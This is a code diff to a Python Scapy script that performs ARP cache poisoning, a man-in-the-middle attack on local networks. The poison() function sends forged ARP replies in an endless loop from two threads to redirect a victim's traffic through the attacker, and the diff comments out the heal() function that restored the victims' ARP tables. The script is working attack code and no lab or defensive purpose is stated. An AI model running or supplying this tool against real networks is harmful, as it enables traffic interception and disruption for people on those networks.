@@ -7,7 +7,7 @@ import os
 
 
 def poison(iface, iface_mac, target_ip, target_mac, source_ip):
-    packet = Ether() / ARP(op=2)
+    packet = Ether() / ARP()
     packet[Ether].src = iface_mac
     packet[ARP].hwsrc = iface_mac
     packet[ARP].psrc = source_ip
@@ -16,14 +16,14 @@ def poison(iface, iface_mac, target_ip, target_mac, source_ip):
     sendp(packet, iface=iface, inter=1, loop=1)
 
 
-def heal(iface, iface_mac, target_ip, target_mac, source_ip, source_mac):
-    packet = Ether() / ARP(op=2)
-    packet[Ether].src = iface_mac
-    packet[ARP].hwsrc = source_mac
-    packet[ARP].psrc = source_ip
-    packet[ARP].hwdst = target_mac
-    packet[ARP].pdst = target_ip
-    sendp(packet, iface=iface)
+# def heal(iface, iface_mac, target_ip, target_mac, source_ip, source_mac):
+#     packet = Ether() / ARP()
+#     packet[Ether].src = iface_mac
+#     packet[ARP].hwsrc = source_mac
+#     packet[ARP].psrc = source_ip
+#     packet[ARP].hwdst = target_mac
+#     packet[ARP].pdst = target_ip
+#     sendp(packet, iface=iface)
 
 
 if __name__ == "__main__":
@@ -49,9 +49,5 @@ if __name__ == "__main__":
     def poison_spoof():
         poison(attacker_iface, attacker_mac, spoof_ip, spoof_mac, victim_ip)
 
-    t1 = Thread(target=poison_victim)
-    t2 = Thread(target=poison_spoof)
-
-    print("Poisoning ARP table...")
-    t1.start()
-    t2.start()
+    t1 = Thread(target=poison_victim).start()
+    t2 = Thread(target=poison_spoof).start()
